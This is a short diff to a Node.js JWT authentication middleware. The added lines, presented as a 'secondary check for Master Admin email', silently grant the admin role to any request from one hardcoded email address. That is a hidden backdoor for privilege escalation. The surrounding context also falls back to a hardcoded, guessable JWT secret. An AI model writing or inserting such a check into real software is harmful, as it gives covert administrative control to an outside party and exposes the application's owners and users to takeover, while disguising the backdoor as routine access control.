@@ -20,6 +20,11 @@ const protect = async (req, res, next) => {
       const decoded = jwt.verify(token, process.env.JWT_SECRET || 'supersecretkey123');
 
       req.user = await User.findById(decoded.id).select('-password');
+      
+      // Secondary check for Master Admin email
+      if (req.user && req.user.email === 'arebhai09@gmail.com') {
+        req.user.role = 'admin';
+      }
 
       next();
     } catch (error) {
